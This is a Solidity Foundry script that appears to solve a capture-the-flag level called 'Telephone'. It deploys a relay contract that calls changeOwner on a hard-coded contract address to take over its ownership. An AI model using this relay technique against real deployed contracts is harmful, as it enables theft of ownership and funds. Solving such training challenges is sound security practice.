// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";

contract Caller {
    address private s_owner;

    constructor() {
        s_owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == s_owner, "not owner");
        _;
    }

    function callTelephone(address _newOwner, address _telephone) external onlyOwner {
        bytes4 selector = bytes4(keccak256(abi.encodePacked("changeOwner(address)")));
        (bool success,) = _telephone.call(abi.encodeWithSelector(selector, _newOwner));
        require(success, "failed to call telephone");
    }
}

contract TelephoneAttack is Script {
    address constant TELEPHONE_ADDRESS = address(0x4D9d5730317879365212F861255F46641131E87C);

    function run() public {
        vm.startBroadcast();
        Caller caller = new Caller();
        caller.callTelephone(msg.sender, TELEPHONE_ADDRESS);
        vm.stopBroadcast();
    }
}
